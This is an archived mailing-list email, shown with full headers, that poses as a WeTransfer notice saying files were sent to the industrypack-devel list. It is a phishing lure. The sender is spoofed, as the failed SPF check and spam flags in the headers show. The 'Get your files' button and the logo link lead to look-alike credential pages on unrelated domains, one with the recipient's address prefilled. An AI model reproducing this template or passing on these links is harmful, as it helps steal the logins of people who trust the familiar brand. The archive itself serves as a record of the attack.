Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 93CD2138951
	for <lists+industrypack-devel@lfdr.de>; Mon, 13 Jan 2020 02:37:59 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Message-ID:
	Date:To:MIME-Version:Sender:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=wHlPk4mYq1lNzYdK3OkT73ieuHyrxxkG0hAMWtWI1jY=; b=ILbVTx8g0iWQ7ZED38zs8xziD1
	jDiEtDYEYwqjLIUTp6ji2Zo5fyCgk0CzeE4p4F2u7kBN7wsjnxKBaNb6WvEk994VOSdgZ0u69lPqE
	X1OQV/sAaaRHQk1m11nmC5/oZepcDK6zsSCBur7sepfERt0Lta3jDszfV9i0rAR1ZaRY=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1iqog2-0007TW-DZ
	for lists+industrypack-devel@lfdr.de; Mon, 13 Jan 2020 01:37:58 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <noreply@wetransfer.com>) id 1iqog1-0007TO-R6
 for industrypack-devel@lists.sourceforge.net; Mon, 13 Jan 2020 01:37:57 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-ID:Date:From:To:Subject:MIME-Version:
 Content-Type:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=9AV3WdEZ+Ox0db5IvT27I9HIr1M4RByem6rzGmViG5g=; b=Mvqh5i/rPiU+/h3a8dFIxb27tt
 4GOZelLkXSqe5ylTeqp8g8Fc/epGhvxvMnFKHFPHhF6JStPhdWuMFbmooyVDGmMXitl6t6T6J6qS5
 O4+zi+sgm2vQ0c5sSzDTZupWHZAkqA9aj+CQPj1PRsiko1sZppRqUnSwzJK42EkytH4E=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-ID:Date:From:To:Subject:MIME-Version:Content-Type:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=9AV3WdEZ+Ox0db5IvT27I9HIr1M4RByem6rzGmViG5g=; b=D
 /0DM1GjFpgikxlxL/lCOiIGdpILPmcWgLtgGKO4nQ6/h0mOzbvWsFQ2Oe9xVW2g+3WWrJFWjByt5O
 POXVD1HfKCCz/4z2fIxyfHB4dWDjLleZbkzV8np9GD3vCrv+yYB1821GuHGEe6jbecFOMlVOZrK/O
 PcPdsT1LjHyfmCyk=;
Received: from slot0.medixalsurg.ml ([85.204.116.235])
 by sfi-mx-4.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1iqog0-000Z46-9k
 for industrypack-devel@lists.sourceforge.net; Mon, 13 Jan 2020 01:37:57 +0000
MIME-Version: 1.0
To: industrypack-devel@lists.sourceforge.net
Date: Sun, 12 Jan 2020 17:33:24 -0800
Message-ID: <0.0.16.82C.1D5C9B19220AD52.0@slot0.medixalsurg.ml>
X-Spam-Score: 5.5 (+++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [85.204.116.235 listed in zen.spamhaus.org]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
 [SPF failed: Please see http://www.openspf.net/Why?s=mfrom;
 id=noreply%40wetransfer.com; ip=85.204.116.235;
 r=util-malware-1.v13.lw.sourceforge.com]
 1.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1iqog0-000Z46-9k
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net Your
 files were sent successfully
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: WeTransfer via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: WeTransfer <noreply@wetransfer.com>
Content-Type: multipart/mixed; boundary="===============6991941408439364697=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

You will not see this in a MIME-aware mail reader.
--===============6991941408439364697==
Content-Type: multipart/alternative; boundary="===============0746536694=="

You will not see this in a MIME-aware mail reader.
--===============0746536694==
Content-Type: text/plain; charset="iso-8859-1"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body

  =

    =

     =

    =


  =

   =


 =

    =

    =

   =

You have received a files via WeTransfer
  2 files, 20 MB in total. Will be deleted on 7th December, 2019
   =

   Get your files
   =20

--===============0746536694==
Content-Type: text/html; charset="iso-8859-1"
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Content-Description: Mail message body

<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
=3Diso-8859-1"/></head><div id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473=
215_35469" style=3D"font-size: 16px; font-family: HelveticaNeue,&quot;Helve=
tica =


Neue&quot;,Helvetica,Arial,&quot;Lucida Grande&quot;,sans-serif; white-spac=
e: normal; word-spacing: 0px; text-transform: none; =


font-weight: 400; color: rgb(0, 0, 0); font-style: normal; text-align: cent=
er; orphans: 2; widows: 2; letter-spacing: normal; =


background-color: rgb(255, 255, 255); text-indent: 0px;">
<div id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35468" =


style=3D"text-align: center;">
<table id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35467" class=3D"y=
iv2956564175gmail-

m_911891310866232251gmail-x_gmail-x_yiv6729642149x_table_full_width yiv2956=
564175yahoo-compose-table-card" style=3D"margin: 0px =


auto; padding: 0px; font-size: 13px; width: 600px; white-space: normal; wor=
d-spacing: 0px; border-collapse: collapse; table-

layout: fixed; text-transform: none; font-weight: 400; color: rgb(38, 40, 4=
2); outline-width: medium; font-style: normal; text-

align: left; outline-style: none; letter-spacing: normal; text-indent: 0px;=
" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
<tbody =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35466">
<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35465">
<td =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35464" class=3D"yiv29565=
64175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_logo_outer_wrapper_td" style=3D"margin: 0px; padding: 55px=
 0px 0px; font-family: arial,sans-serif; width: 600px; =


outline-width: medium; outline-style: none;" align=3D"left" valign=3D"top">
<table =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35578" class=3D"yiv29565=
64175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_table_full_width yiv2956564175yahoo-compose-table-card" st=
yle=3D"margin: 0px; padding: 0px; width: 600px; =


border-collapse: collapse; table-layout: fixed; outline-width: medium; outl=
ine-style: none;" border=3D"0" cellpadding=3D"0" =


cellspacing=3D"0">
<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35577">
<tr =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35576">
<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35575" =


class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
49x_logo_inner_wrapper_td" style=3D"margin: 0px; padding: =


0px; font-size: 10px; font-family: arial,sans-serif; width: 600px; outline-=
width: medium; outline-style: none;" align=3D"left" =


bgcolor=3D"#409fff" valign=3D"top">
<center id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35574">
<table =


class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
49x_table_centered yiv2956564175yahoo-compose-table-

card" style=3D"margin: 0px auto; padding: 0px; width: auto; border-collapse=
: collapse; table-layout: fixed; outline-width: medium; =


outline-style: none;" align=3D"center" border=3D"0" cellpadding=3D"0" cells=
pacing=3D"0">
<tbody>
<tr>
<td style=3D"margin: 0px; padding: 0px; =


font-family: arial,sans-serif; width: 56px; outline-width: medium; outline-=
style: none; min-height: 16px;" align=3D"left" =


height=3D"16" valign=3D"top"> <br></td></tr>
<tr>
<td style=3D"margin: 0px; padding: 0px; font-family: arial,sans-serif; widt=
h: 56px; =


outline-width: medium; outline-style: none;" align=3D"left" valign=3D"top">=
<a style=3D"text-decoration: underline; color: rgb(25, 106, =


212);" href=3D"http://fueledbygumbo.com/decent-ysgihs/revlutionary-autologs=
/log404/stylesedited/try.php?

main_domain=3Dmail.&amp;account=3D&amp;email&amp;" rel=3D"nofollow" target=
=3D"_blank"><img class=3D"yiv2956564175gmail-

m_911891310866232251gmail-x_gmail-x_yiv6729642149x_logo_white_img" style=3D=
"margin: 0px; padding: 0px; width: 56px; outline-width: =


medium; outline-style: none; display: block; line-height: 10px;" alt=3D"Cli=
ck 'Download images' to view images" =


src=3D"https://encrypted-tbn0.gstatic.com/images?q=3Dtbn:ANd9GcRlqia-bqB-aA=
ynw2SvOlHGG5olxEcKEMZZ1YyIieZ7ww4We7cTFA" align=3D"middle" =


border=3D"0" height=3D"30" width=3D"50"></a></td></tr>
<tr>
<td style=3D"margin: 0px; padding: 0px; font-family: arial,sans-serif; widt=
h: =


56px; outline-width: medium; outline-style: none; min-height: 11px;" align=
=3D"left" height=3D"11" valign=3D"top"> =


<br></td></tr></tbody></table></center></td></tr></tbody></table></td></tr>=
</tbody></table>
<table =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35591" class=3D"yiv29565=
64175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_main_content_outer_wrapper_table yiv2956564175yahoo-compos=
e-table-card" style=3D"margin: 0px auto; padding: 0px; =


font-size: 13px; width: 600px; white-space: normal; word-spacing: 0px; bord=
er-collapse: collapse; table-layout: fixed; text-

transform: none; font-weight: 400; color: rgb(38, 40, 42); outline-width: m=
edium; font-style: normal; text-align: left; =


outline-style: none; letter-spacing: normal; background-color: rgb(255, 255=
, 255); text-indent: 0px;" bgcolor=3D"#ffffff" =


border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35590">
<tr =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35589">
<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35588" =


style=3D"margin: 0px; padding: 0px; font-family: arial,sans-serif; width: 6=
00px; outline-width: medium; outline-style: none;" =


align=3D"left" valign=3D"top">
<table id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35587" class=3D"y=
iv2956564175gmail-

m_911891310866232251gmail-x_gmail-x_yiv6729642149x_table_full_width yiv2956=
564175yahoo-compose-table-card" style=3D"margin: 0px; =


padding: 0px; width: 600px; border-collapse: collapse; table-layout: fixed;=
 outline-width: medium; outline-style: none;" =


border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35586">
<tr =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35585">
<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35584" =


class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
49x_padded_mobile yiv2956564175gmail-

m_911891310866232251gmail-x_gmail-x_yiv6729642149x_main_content_inner_wrapp=
er_td" style=3D"margin: 0px; padding: 0px; font-family: =


arial,sans-serif; width: 600px; outline-width: medium; outline-style: none;=
" align=3D"left" valign=3D"top">
<table =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35583" class=3D"yiv29565=
64175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_table_full_width yiv2956564175yahoo-compose-table-card" st=
yle=3D"margin: 0px; padding: 0px; width: 600px; =


border-collapse: collapse; table-layout: fixed; outline-width: medium; outl=
ine-style: none;" border=3D"0" cellpadding=3D"0" =


cellspacing=3D"0">
<tbody id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35582">
<tr style=3D"font-size: 15px; color: rgb(33, 33, =


33);">
<td class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv6729=
642149x_main_heading_td yiv2956564175gmail-

m_911891310866232251gmail-x_gmail-x_yiv6729642149x_unpadded_mobile yiv29565=
64175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_main_heading_td_wider" style=3D"margin: 0px; padding: 60px=
 80px 0px; font-size: 26px; width: 440px; color: rgb

(23, 24, 26); outline-width: medium; outline-style: none; line-height: 30px=
;" align=3D"center" valign=3D"top"><span =


class=3D"yiv2956564175gmail-m_911891310866232251gmail-x_gmail-x_yiv67296421=
49x_main_heading_email_link"></span><br>You have =


received a files via WeTransfer</td></tr>
<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35581" style=3D"font=
-size: 15px; =


color: rgb(33, 33, 33);">
<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518394473215_35580" class=3D"yiv2=
956564175gmail-

m_911891310866232251gmail-x_gmail-x_yiv6729642149x_files_details_td yiv2956=
564175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_unpadded_mobile" style=3D"margin: 0px; padding: 20px 80px =
0px; font-size: 14px; width: 440px; color: rgb(145, =


149, 153); outline-width: medium; outline-style: none; line-height: 23px;" =
align=3D"center" valign=3D"top">2 files, 20 MB in total. =


Will be deleted on 7th December, 2019</td></tr>
<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8527" style=3D"font-=
size: =


15px; color: rgb(33, 33, 33);">
<td id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8526" class=3D"yiv29=
56564175gmail-

m_911891310866232251gmail-x_gmail-x_yiv6729642149x_button_outer_wrapper_td =
yiv2956564175gmail-m_911891310866232251gmail-

x_gmail-x_yiv6729642149x_unpadded_mobile" style=3D"margin: 0px; padding: 40=
px 160px 0px; font-family: arial,sans-serif; width: =


280px; outline-width: medium; outline-style: none;" align=3D"left" valign=
=3D"top">
<table =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8525" class=3D"yiv295656=
4175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_table_full_width yiv2956564175gmail-m_911891310866232251gm=
ail-x_gmail-x_yiv6729642149x_button_table =


yiv2956564175yahoo-compose-table-card" style=3D"margin: 0px; padding: 0px; =
width: 280px; border-collapse: collapse; table-layout: =


fixed; outline-width: medium; outline-style: none;" border=3D"0" cellpaddin=
g=3D"0" cellspacing=3D"0">
<tbody =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8524">
<tr id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8523">
<td =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8522" style=3D"margin: 0=
px; padding: 0px; font-family: arial,sans-serif; width: =


280px; outline-width: medium; outline-style: none;" align=3D"left" valign=
=3D"top"><a =


id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_8521" class=3D"yiv295656=
4175gmail-m_911891310866232251gmail-x_gmail-

x_yiv6729642149x_button_anchor yiv2956564175gmail-m_911891310866232251gmail=
-x_gmail-x_yiv6729642149x_button_2_anchor" =


style=3D"padding: 15px 20px; font-size: 14px; text-decoration: underline; c=
olor: rgb(255, 255, 255); text-align: center; display: =


block; background-color: rgb(64, 159, 255);" href=3D"http://sgritrcsaonwaz.=
esy.es/newwetrasfzr/index.php?email=3Dindustrypack-devel@lists.sourceforge.=
net" rel=3D"nofollow" =


target=3D"_top"><span id=3D"yiv2956564175yui_3_16_0_ym19_1_1518589672456_85=
20">Get your =


files</span></a></td></tr></tbody></table><!--!
 TD--></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody=
></table>
<div style=3D"font-size: 13px; white-space: =


normal; word-spacing: 0px; text-transform: none; font-weight: 400; color: r=
gb(38, 40, 42); font-style: normal; letter-spacing: =


normal; text-indent: 0px;"> </div>
<div style=3D"font-size: 15px; white-space: normal; word-spacing: 0px; text=
-transform: none; =


font-weight: 400; color: rgb(33, 33, 33); font-style: normal; letter-spacin=
g: normal; text-indent: 0px;"> </div></div></div><br =


class=3D"Apple-interchange-newline"></html>
--===============0746536694==--


--===============6991941408439364697==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6991941408439364697==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6991941408439364697==--

